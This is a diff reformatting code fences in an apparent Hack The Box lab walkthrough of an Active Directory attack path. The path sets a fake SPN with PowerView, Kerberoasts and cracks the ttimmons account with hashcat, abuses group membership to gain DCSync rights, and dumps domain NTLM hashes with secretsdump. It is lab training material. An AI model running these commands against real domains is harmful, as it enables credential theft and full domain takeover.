@@ -12,16 +12,14 @@ Digging into the BloodHound data we see that we have `GenericWrite` over the `tt
 
 Let's go back to the `DEV01` machine where we had loaded PowerView. We can create a PSCredential object to be able to run commands as the `mssqladm` user without having to RDP again.
 
-```
-        powershell
+```powershell
 PS C:\DotNetNuke\Portals\0> $SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
 PS C:\DotNetNuke\Portals\0> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
 ```
 
 Next we'll use `Set-DomainObject` to set a fake SPN on the target account. We'll create an SPN named `acmetesting/LEGIT` which we'll of course delete later and note in the appendices of our report.
 
-```
-        powershell
+```powershell
 PS C:\DotNetNuke\Portals\0> Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose
 
 VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
@@ -35,8 +33,7 @@ VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'acmetesting/LEGIT
 
 Next we can go back to our attack host and use `GetUserSPNs.py` to perform a targeted Keberoasting attack.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons
 
 ProxyChains-3.1 (http://proxychains.sf.net)
@@ -56,8 +53,7 @@ $krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/ttimmons*$6c391145
 
 Next we'll fire up Hashcat and see if the user is using a weak password.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ hashcat -m 13100 ttimmons_tgs /usr/share/wordlists/rockyou.txt
 
 hashcat (v6.1.1) starting...
@@ -96,16 +92,14 @@ Looking a bit further we see that the `SERVER ADMINS` group has the ability to p
 
 We use abuse this by first adding the `ttimmons` user to the group. First we'll need to create another PSCredential object.
 
-```
-        powershell
+```powershell
 PS C:\htb> PS C:\DotNetNuke\Portals\0> $timpass = ConvertTo-SecureString '<PASSWORD REDACTED>' -AsPlainText -Force
 PS C:\DotNetNuke\Portals\0> $timcreds = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\ttimmons', $timpass)
 ```
 
 Once this is done, we can add the user to the target group and inherit the DCSync privileges.
 
-```
-        powershell
+```powershell
 PS C:\DotNetNuke\Portals\0> $group = Convert-NameToSid "Server Admins"
 PS C:\DotNetNuke\Portals\0> Add-DomainGroupMember -Identity $group -Members 'ttimmons' -Credential $timcreds -verbose
 
@@ -115,8 +109,7 @@ VERBOSE: [Add-DomainGroupMember] Adding member 'ttimmons' to group 'S-1-5-21-281
 
 Finally, we can use Secretsdump to DCSync all NTLM password hashes from the Domain Controller.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm
 
 ProxyChains-3.1 (http://proxychains.sf.net)
